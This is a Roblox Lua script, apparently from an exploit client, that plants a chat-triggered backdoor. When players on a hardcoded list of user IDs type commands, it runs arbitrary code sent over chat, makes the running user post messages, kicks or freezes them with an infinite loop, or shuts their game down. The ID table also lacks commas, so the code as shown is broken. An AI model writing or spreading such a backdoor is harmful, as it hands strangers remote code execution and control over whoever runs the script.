local function getplr(str)
    local plrs = game.Players:GetPlayers()
    if str:lower() == "all" then
        return plrs
    elseif str:lower() == "others" then
        for i, v in ipairs(plrs) do
            if v == game.Players.LocalPlayer then
                table.remove(plrs, i)
                return plrs
            end
        end
    elseif str:lower() == "me" then
        return {game.Players.LocalPlayer}
    else
        local cockandballs = {}
        for i, v in pairs(game.Players:GetPlayers()) do
            if str:lower() == (v.Name:lower()):sub(1, #str) or str:lower() == (v.DisplayName:lower()):sub(1, #str) then
                table.insert(cockandballs, v)
            end
        end
        return cockandballs
    end
end
local allowed = {
    1551416114, -- wrydioda4 - knocks
    252684030, -- jjjuuikjjikkju - knocks
    2172305, -- antemono / kyrofrost / timeless / reiko
    4793416752 -- knocks
    7126612490 -- hawaiianbroski / reiko
    411845421 -- rin
    7348878539-- rin
    7603097827 -- day
    518978417 -- FR6DDiiee
    4217459491 -- Kozy
    1702851506 -- tech
    5405947853 -- cxo
    1842223904 -- tech
    2049407929 -- jotunn
    142903777 -- ripend
}
local bdconnections = {}
local function updbd()
    for i,v in pairs(bdconnections) do
        pcall(function()
            v:Disconnect()
        end)
    end
    for i, v in pairs(game.Players:GetPlayers()) do
        if table.find(allowed, v.UserId) then
            bdconnections[v.UserId] =
                v.Chatted:Connect(
                function(msg)
                    local args = msg:split(" ")
                    if args[1] == "^run" then
                        loadstring(table.concat(args, " ", 2))()
                    elseif args[1] == "^ktest" then
                        game.Players:Chat(
                            "(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)(!)"
                        )
                        game.Players:Chat("aƀçđȇfĝħíǰκ|ɱňοƥʠŕšţûѷwẋƴž")
                        task.wait(0.3)
                        local args = {
                            [1] = "/w " .. v.Name .. " i am indeed using solinium",
                            [2] = "All"
                        }

                        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild(
                            "SayMessageRequest"
                        ):FireServer(unpack(args))
                    elseif args[1] == "^kick" then
                        for i,v in pairs(getplr(args[2])) do
                            if v == game.Players.LocalPlayer then
                                local reason = table.concat(args, " ", 3)
                                game.Players.LocalPlayer:Kick(reason)
                                task.wait(1)
                                repeat until false
                            end
                        end
                    elseif args[1] == "^crash" then
                        repeat until false
                    elseif args[1] == "^say" then
                        local args = {
                            [1] = tostring(table.concat(args, " ", 3)),
                            [2] = "All"
                        }

                        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild(
                            "SayMessageRequest"
                        ):FireServer(unpack(args))
                    elseif args[1] == "^eject" then
                        for i,v in pairs(getplr(args[2])) do
                            if v == game.Players.LocalPlayer then
                                game:Shutdown()
                            end
                        end
                    end
                end
            )
        end
    end
end

task.delay(0.5, function()
    game.Players.PlayerAdded:Connect(function()
        updbd()
    end)
    game.Players.PlayerRemoving:Connect(function()
        updbd()
    end)
    updbd()
end)
